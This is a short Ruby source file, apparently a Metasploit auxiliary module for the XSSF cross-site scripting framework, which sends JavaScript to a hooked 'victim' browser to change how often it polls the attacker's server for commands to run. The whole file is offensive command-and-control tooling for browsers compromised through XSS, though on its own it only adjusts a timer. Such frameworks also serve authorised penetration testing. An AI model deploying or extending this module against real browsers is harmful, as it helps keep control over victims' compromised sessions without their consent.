require 'msf/core'
require 'msf/base/xssf'


#
# READ README FILE FOR MORE INFORMATION ABOUT MODULES
# Changes the victim interval between command ask to server
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Interval changer',
			'Description' => 'Changes the victim interval between command ask to server'
		))
		
		register_options(
			[
				OptInt.new('interval', [true, 'New Interval', 5])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			clearTimeout(victim_loop);
			victim_loop = setInterval(executeCode, #{datastore['interval']} * 1000);	
		}
		send_response(cli, code)
	end
end